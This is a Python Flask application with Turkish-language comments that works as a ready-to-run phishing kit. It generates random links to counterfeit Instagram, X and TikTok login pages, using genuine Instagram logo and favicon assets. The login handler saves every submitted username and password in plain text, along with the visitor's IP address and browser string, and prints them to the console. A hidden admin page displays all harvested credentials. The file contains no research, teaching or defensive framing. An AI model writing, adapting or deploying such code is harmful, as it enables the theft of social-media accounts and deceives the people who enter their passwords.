from flask import Flask, render_template_string, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import random
import string
import socket

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///ipl.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

SECRET_ADMIN_PATH = "".join(random.choices(string.ascii_letters + string.digits, k=32))  # Rastgele oluştur
print(f"ADMIN PANEL URL: /admin/{SECRET_ADMIN_PATH}")  # Bu çıktıyı kaydedin

# DB modeli
class Link(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    site = db.Column(db.String(50))
    random_path = db.Column(db.String(50), unique=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Visitor(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(50))
    username = db.Column(db.String(100))
    password = db.Column(db.String(100))
    link_id = db.Column(db.Integer)
    user_agent = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

def random_string(length=8):
    chars = string.ascii_letters + string.digits
    while True:
        s = ''.join(random.choice(chars) for _ in range(length))
        if not Link.query.filter_by(random_path=s).first():
            return s

def get_public_ip():
    # Basit public IP tespiti
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Google DNS'e bağlanıp kendi IP'ni öğreniyoruz
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "localhost"
    finally:
        s.close()
    return ip

# HTML Template (inline CSS ve JS var)
HOME_HTML = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IPL - Link Oluşturucu</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #f8f9fa;
            padding-top: 2rem;
        }
        .card {
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .card-header {
            background-color: #0d6efd;
            color: white;
            border-radius: 15px 15px 0 0 !important;
        }
        .form-select, .btn-primary {
            border-radius: 8px;
        }
        .list-group-item {
            border-radius: 8px !important;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .link-text {
            font-family: monospace;
            word-break: break-all;
            color: #0d6efd;
            flex-grow: 1;
            margin-right: 10px;
        }
        .copy-btn {
            border-radius: 8px;
            min-width: 80px;
        }
        .admin-section {
            margin-top: 2rem;
            background-color: #f1f1f1;
            border-radius: 15px;
            padding: 15px;
        }
        .empty-state {
            text-align: center;
            padding: 20px;
            color: #6c757d;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-lg-8">
                <div class="card">
                    <div class="card-header text-center">
                        <h3><i class="fas fa-link me-2"></i>IPL Link Oluşturucu</h3>
                    </div>
                    <div class="card-body">
                        <form method="POST" id="form">
                            <div class="mb-3">
                                <select class="form-select" name="site" id="site" required>
                                    <option value="" disabled selected>Site Seçiniz</option>
                                    <option value="instagram">Instagram</option>
                                    <option value="instagram">Instagram</option>
                                    <option value="x">X (Twitter)</option>
                                    <option value="tiktok">TikTok</option>

                                </select>
                            </div>
                            <button type="submit" class="btn btn-primary w-100">
                                <i class="fas fa-plus-circle me-2"></i>Link Oluştur
                            </button>
                        </form>

                        <div class="mt-4">
                            <h5 class="mb-3"><i class="fas fa-history me-2"></i>Oluşturulan Linkler</h5>
                            <div class="list-group" id="links-list">
                                {% for l in links %}
                                <div class="list-group-item">
                                    <span class="link-text">{{ base_url }}/site/{{ l.random_path }}</span>
                                    <button class="btn btn-outline-secondary copy-btn" onclick="copyToClipboard('{{ base_url }}/site/{{ l.random_path }}')">
                                        <i class="fas fa-copy me-1"></i>Kopyala
                                    </button>
                                </div>
                                {% else %}
                                <div class="empty-state">
                                    <i class="fas fa-exclamation-circle fa-2x mb-2"></i>
                                    <p>Henüz link oluşturulmadı.</p>
                                </div>
                                {% endfor %}
                            </div>
                        </div>
                    </div>
                </div>

                <div class="admin-section">
                    <h5 class="text-center mb-3"><i class="fas fa-lock me-2"></i>Admin Paneli</h5>
                    <div class="d-flex justify-content-between align-items-center">
                        <span class="link-text">{{ base_url }}/admin/{{ admin_path }}</span>
                        <button class="btn btn-outline-dark copy-btn" onclick="copyToClipboard('{{ base_url }}/admin/{{ admin_path }}')">
                            <i class="fas fa-copy me-1"></i>Kopyala
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                // Create a temporary tooltip
                const tooltip = document.createElement('div');
                tooltip.style.position = 'fixed';
                tooltip.style.backgroundColor = '#333';
                tooltip.style.color = 'white';
                tooltip.style.padding = '5px 10px';
                tooltip.style.borderRadius = '4px';
                tooltip.style.zIndex = '9999';
                tooltip.style.top = (event.clientY - 40) + 'px';
                tooltip.style.left = event.clientX + 'px';
                tooltip.textContent = 'Kopyalandı!';
                document.body.appendChild(tooltip);
                
                // Remove after 2 seconds
                setTimeout(() => {
                    document.body.removeChild(tooltip);
                }, 2000);
            }).catch(err => {
                alert('Kopyalama hatası: ' + err);
            });
        }
    </script>
</body>
</html>
'''

INSTAGRAM_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 32px;
            margin-bottom: 32px;
            max-width: 935px;
            width: 100%;
        }
        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px 40px;
            margin-top: 12px;
            max-width: 350px;
            width: 100%;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .logo {
            margin: 22px auto 12px;
            width: 175px;
            display: block;
        }
        form {
            margin-top: 24px;
        }
        .input-field {
            margin-bottom: 6px;
            position: relative;
        }
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            color: #262626;
            font-size: 14px;
            padding: 12px 8px;
            width: 100%;
            transition: border-color 0.2s;
        }
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-weight: 600;
            padding: 8px;
            width: 100%;
            margin-top: 12px;
            cursor: pointer;
            font-size: 14px;
            transition: background-color 0.2s;
        }
        button:hover {
            background-color: #0077c2;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
        }
        .line {
            background-color: #dbdbdb;
            height: 1px;
            flex-grow: 1;
        }
        .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin: 16px 0;
            text-align: center;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .fb-login i {
            margin-right: 8px;
            font-size: 18px;
        }
        .forgot-pw {
            color: #00376b;
            font-size: 12px;
            line-height: 14px;
            margin-top: 16px;
            text-align: center;
            cursor: pointer;
        }
        .signup {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            margin-top: 10px;
            max-width: 350px;
            width: 100%;
            text-align: center;
            font-size: 14px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .signup a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .app-download {
            margin-top: 20px;
            text-align: center;
        }
        .app-download p {
            font-size: 14px;
            margin: 10px 20px;
            color: #262626;
        }
        .app-stores {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            gap: 10px;
        }
        .app-store {
            height: 40px;
            border-radius: 5px;
        }
        footer {
            margin-top: 24px;
            margin-bottom: 52px;
            max-width: 935px;
            width: 100%;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px 16px;
        }
        .footer-links a {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }
        .copyright {
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 16px;
            text-align: center;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
            
            <form method="POST" action="/login/{{ random_path }}">
                <div class="input-field">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-field">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log In</button>
            </form>
            
            <div class="divider">
                <div class="line"></div>
                <div class="or">or</div>
                <div class="line"></div>
            </div>
            
            <div class="fb-login">
                <i class="fab fa-facebook-square"></i> Log in with Facebook
            </div>
            
            <div class="forgot-pw">Forgot password?</div>
        </div>
        
        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        
        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-stores">
                <img class="app-store" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
                <img class="app-store" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
            </div>
        </div>
    </div>
    
    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Hashtags</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Contact Uploading & Non-Users</a>
        </div>
        <div class="copyright">
            English © 2023 Instagram from Meta
        </div>
    </footer>
</body>
</html>
'''
X_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>X. It's what's happening</title>
    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.2.ico">
    <style>
        body {
            background-color: #000;
            color: white;
            font-family: "Segoe UI", Roboto, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            background: #111;
            padding: 30px;
            border-radius: 10px;
            width: 320px;
        }
        .logo {
            font-size: 36px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border: 1px solid #333;
            border-radius: 6px;
            background: #000;
            color: white;
        }
        button {
            width: 100%;
            margin-top: 15px;
            padding: 10px;
            border: none;
            background-color: #1d9bf0;
            color: white;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">𝕏</div>
        <form method="POST" action="/login/{{ random_path }}">
            <input type="text" name="username" placeholder="Phone, email or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
</body>
</html>
'''
TIKTOK_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TikTok - Make Your Day</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
    <style>
        body {
            margin: 0;
            font-family: 'Helvetica Neue', sans-serif;
            background: linear-gradient(to right, #000, #111);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }
        .box {
            background: #222;
            padding: 30px;
            border-radius: 12px;
            width: 350px;
        }
        .logo {
            text-align: center;
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #444;
            border-radius: 8px;
            background: #000;
            color: white;
        }
        button {
            width: 100%;
            padding: 10px;
            border: none;
            background-color: #ff0050;
            color: white;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">TikTok</div>
        <form method="POST" action="/login/{{ random_path }}">
            <input type="text" name="username" placeholder="Email / Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
'''


SUCCESS_HTML = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Başarılı</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .message-box {
            background: white;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 500px;
            width: 90%;
            border-top: 5px solid #28a745;
        }
        .success-icon {
            font-size: 4rem;
            color: #28a745;
            margin-bottom: 1rem;
        }
        .btn-home {
            margin-top: 1.5rem;
        }
    </style>
</head>
<body>
    <div class="message-box">
        <div class="success-icon">
            <i class="fas fa-check-circle"></i>
        </div>
        <h3 class="text-success">Başarılı!</h3>
        <p class="lead">Bilgileriniz başarıyla gönderildi. Teşekkürler.</p>
        <a href="/" class="btn btn-success btn-home">
            <i class="fas fa-home me-2"></i>Ana Sayfaya Dön
        </a>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
'''

ADMIN_HTML = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Paneli</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #f8f9fa;
            padding-top: 2rem;
        }
        .card {
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 2rem;
        }
        .card-header {
            background-color: #343a40;
            color: white;
            border-radius: 15px 15px 0 0 !important;
        }
        .table-responsive {
            border-radius: 0 0 15px 15px;
            overflow: hidden;
        }
        .table {
            margin-bottom: 0;
        }
        .table th {
            background-color: #f1f1f1;
            position: sticky;
            top: 0;
        }
        .badge {
            font-size: 0.9em;
        }
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #6c757d;
        }
        .stats-card {
            border-left: 4px solid #0d6efd;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="row mb-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <h4 class="mb-0"><i class="fas fa-tachometer-alt me-2"></i>Admin Paneli - İstatistikler</h4>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-4 mb-3">
                                <div class="card h-100 stats-card">
                                    <div class="card-body">
                                        <h5 class="card-title">Toplam Link</h5>
                                        <h2 class="card-text">{{ links_count }}</h2>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4 mb-3">
                                <div class="card h-100 stats-card">
                                    <div class="card-body">
                                        <h5 class="card-title">Toplam Giriş</h5>
                                        <h2 class="card-text">{{ visitors_count }}</h2>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4 mb-3">
                                <div class="card h-100 stats-card">
                                    <div class="card-body">
                                        <h5 class="card-title">Son Giriş</h5>
                                        <h6 class="card-text">{{ last_visitor_time }}</h6>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <h4 class="mb-0"><i class="fas fa-list me-2"></i>Giriş Yapılan Kayıtlar</h4>
                    </div>
                    <div class="table-responsive">
                        <table class="table table-striped table-hover">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>IP</th>
                                    <th>Kullanıcı Adı</th>
                                    <th>Şifre</th>
                                    <th>Link ID</th>
                                    <th>Tarayıcı</th>
                                    <th>Zaman</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for v in visitors %}
                                <tr>
                                    <td>{{ v.id }}</td>
                                    <td>{{ v.ip }}</td>
                                    <td>{{ v.username }}</td>
                                    <td>{{ v.password }}</td>
                                    <td>{{ v.link_id }}</td>
                                    <td>{{ v.user_agent[:50] }}...</td>
                                    <td>{{ v.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td>
                                </tr>
                                {% else %}
                                <tr>
                                    <td colspan="7" class="text-center py-4">
                                        <div class="empty-state">
                                            <i class="fas fa-exclamation-circle fa-2x mb-3"></i>
                                            <p>Henüz giriş yapılmadı.</p>
                                        </div>
                                    </td>
                                </tr>
                                {% endfor %}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Tabloyu yenile butonu eklenebilir
    </script>
</body>
</html>
'''

# Routes

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        site = request.form.get("site")
        if not site:
            return redirect(url_for("home"))
        # Rastgele link oluştur ve DB'ye kaydet
        rand_path = random_string(10)
        new_link = Link(site=site, random_path=rand_path)
        db.session.add(new_link)
        db.session.commit()
        return redirect(url_for("home"))
    links = Link.query.order_by(Link.created_at.desc()).all()
    base_url = f"http://{get_public_ip()}:5000"
    return render_template_string(HOME_HTML, links=links, base_url=base_url, admin_path=SECRET_ADMIN_PATH)

@app.route("/site/<random_path>", methods=["GET"])
def show_site(random_path):
    link = Link.query.filter_by(random_path=random_path).first_or_404()
    if link.site == "instagram":
        return render_template_string(INSTAGRAM_HTML, random_path=random_path)
    elif link.site == "x":
        return render_template_string(X_HTML, random_path=random_path)
    elif link.site == "tiktok":
        return render_template_string(TIKTOK_HTML, random_path=random_path)
    else:
        return "Site desteklenmiyor", 404

@app.route("/login/<random_path>", methods=["POST"])
def login(random_path):
    link = Link.query.filter_by(random_path=random_path).first_or_404()
    username = request.form.get("username")
    password = request.form.get("password")
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")

    # Visitor kaydını oluştur
    new_visitor = Visitor(
        ip=ip,
        username=username,
        password=password,
        link_id=link.id,
        user_agent=user_agent
    )
    db.session.add(new_visitor)
    db.session.commit()

    print(f"[{datetime.utcnow()}] IP: {ip} - UA: {user_agent} - Username: {username} - Password: {password} - LinkID: {random_path}")
    return render_template_string(SUCCESS_HTML)

@app.route(f"/admin/{SECRET_ADMIN_PATH}")
def admin():
    visitors = Visitor.query.order_by(Visitor.timestamp.desc()).all()
    links_count = Link.query.count()
    visitors_count = Visitor.query.count()
    last_visitor = Visitor.query.order_by(Visitor.timestamp.desc()).first()
    last_visitor_time = last_visitor.timestamp.strftime('%Y-%m-%d %H:%M:%S') if last_visitor else "Kayıt yok"

    return render_template_string(
        ADMIN_HTML,
        visitors=visitors,
        links_count=links_count,
        visitors_count=visitors_count,
        last_visitor_time=last_visitor_time
    )

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    public_ip = get_public_ip()  # Otomatik IP algılama
    print(f"\nUygulama adresi: http://{public_ip}:5000")
    print(f"Admin paneli: http://{public_ip}:5000/admin/{SECRET_ADMIN_PATH}\n")
    app.run(host="0.0.0.0", port=5000, debug=False)  # debug=False production'da
